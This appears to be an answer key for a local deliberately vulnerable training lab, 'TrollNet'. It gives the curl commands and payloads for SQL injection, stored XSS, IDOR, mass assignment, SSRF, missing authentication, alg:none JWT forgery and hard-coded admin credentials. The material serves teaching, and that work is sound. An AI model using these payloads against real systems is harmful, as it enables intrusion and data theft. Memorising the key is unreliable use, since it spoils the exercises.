# TrollNet — Task Answers (testing document)

Local training lab only. **Flags are now earned, not leaked.** Each objective's flag can be
obtained **only** through that objective's own vulnerability — there is no universal leak any
more. The single exception is the data-exposure objective (**VULN-SPOT #15**), whose whole
lesson is that its flag is still returned by `GET /api/objectives`.

Each objective carries a `vector` field telling you which vulnerability reveals its flag:

| vector | earn the flag by | teacher shortcut |
| --- | --- | --- |
| `DataLeak` (#15) | `GET /api/objectives` → `.flag` | same |
| `Sqli` (#01) | inject in `/api/posts/search`; flag is in the post's `systemNote` | — |
| `Idor` (#03) | `GET /api/posts/<id>/note` (no ownership check) | — |
| `MissingAuth` (#08) | `GET /internal/posts/<id>` returns the hidden `systemNote` | — |
| `Ssrf` (#06) | link-preview fetch of `http://game-service:8080/internal/vault/<objId>` | — |
| `MassAssign` (#04) | forge `isTrending`/`authorId` on `POST /api/posts`; flag echoed in `systemNote` | — |
| `Xss` (#02) | read `window.__trollnetNotices[<objId>]` in the browser console / via a payload | `GET /api/objectives/<id>/notice` with any token |
| `AdminEndpoint` (#13, #16) | `GET /api/objectives/<objId>/flag` with an Admin token (forged `alg:none`, or admin login) | same |

Teacher override for any objective: `GET /api/objectives/<id>/flag` with the admin token
(sign in as `admin` / `admin1234`) still reveals it.

---

## Task answers

### #01 — SQL Injection (CWE-89)
**Answer:** the search query is concatenated into SQL instead of bound.
**How:** `curl -G --data-urlencode "query=' OR 1=1 --" http://localhost:8080/api/posts/search`
**Flag source:** the SQLi objective hides its flag in the target post's `systemNote`; `' OR 1=1 --` dumps it.

### #02 — Stored XSS (CWE-79)
**Answer:** post/comment content is rendered as raw HTML (`dangerouslySetInnerHTML`).
**Code to paste (post or comment):**
```html
<img src=x onerror="alert(document.domain)">
```
**Where:** composer textarea on the Feed, comment form, or `POST /api/posts` / `POST /api/posts/{id}/comments`.
**Flag source:** this objective's flag is loaded into `window.__trollnetNotices[<id>]` — read it in the console.

### #03 — IDOR / Broken Access Control (CWE-639)
**Answer:** delete endpoints lack ownership checks.
**How:** `curl -X DELETE http://localhost:8080/api/posts/<id> -H "Authorization: Bearer $TOKEN"` → `204`.
Your own guest token works on any post — no ownership check — so you do not need another player's token. (The `/internal/posts/<id>` route needs no token at all.)

### #04 — Mass Assignment (CWE-915)
**Answer:** request fields are copied onto the entity.
**How:** `POST /api/posts` with `{"content":"hi","authorId":999,"isTrending":true}`.

### #06 — SSRF (CWE-918)
**Answer:** server fetches any URL given.
**How:** `curl -X POST http://localhost:8080/api/link-preview -H 'Content-Type: application/json' -d '{"url":"http://social-service:8080/health"}'`
**Flag source:** the SSRF objective's flag lives at `http://game-service:8080/internal/vault/<objId>` (reachable only server-side).

### #08 — Missing Authentication (CWE-306)
**Answer:** internal endpoints left open; gateway routes `/internal/*` publicly.
**How:** `curl -X POST http://localhost:8080/internal/posts -H 'Content-Type: application/json' -d '{"authorName":"intruder","content":"pwned","isTrending":false}'`
(Note the path is `/internal/posts`, **not** `/api/internal/posts` — the gateway routes `/internal/*` directly to the social service.)

### #13 — Improper JWT Verification (CWE-347)
**Answer:** signature/issuer/audience/lifetime validation disabled → forge `alg:none` token with `role=Admin`.
**How (in-browser terminal now provides it):**
```bash
curl -X GET "http://localhost:8080/api/objectives/<objectiveId>/flag" -H "Authorization: Bearer <forged-admin-jwt>"
```
**Flag:** via admin flag endpoint with forged token, or real admin (#16).

### #15 — Sensitive Data Exposure (CWE-200)
**Answer:** anonymous `GET /api/objectives` returns every flag.
**How:** `curl http://localhost:8080/api/objectives | jq '.[0].flag'`

### #16 — Hard-coded Credentials (CWE-798)
**Answer:** admin password and JWT secret committed in repo.
**How:** `POST /api/auth/login {"username":"admin","password":"admin1234"}` → admin token → flag endpoint.

---

## Quick smoke-test cheat sheet

```bash
# #15 — data exposure: the ONE objective whose flag still leaks
curl -s http://localhost:8080/api/objectives | jq '.[] | select(.vector=="DataLeak") | .flag'

# teacher override for ANY objective (admin token from admin/admin1234, or a forged alg:none token)
curl -X GET "http://localhost:8080/api/objectives/<id>/flag" -H "Authorization: Bearer $ADMIN"

# #02 — stored XSS payload
curl -X POST http://localhost:8080/api/posts -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"content":"<img src=x onerror=\"alert(1)\">"}'

# #06 — SSRF to the internal vault
curl -X POST http://localhost:8080/api/link-preview -H 'Content-Type: application/json' \
  -d '{"url":"http://game-service:8080/internal/vault/<objId>"}'
```

## Notes

- Reset the lab with `docker compose down -v` when objectives/flags need a clean slate.
- The browser UI ships an always-on **terminal** docked to the side. Each objective shows a "How to
  capture" hint with a **Run in terminal** button that loads the exact command for its vulnerability.
- A top-bar **Sign in** control lets you log in as the seeded admin (`admin` / `admin1234`) for the
  AdminEndpoint objectives (#13, #16).
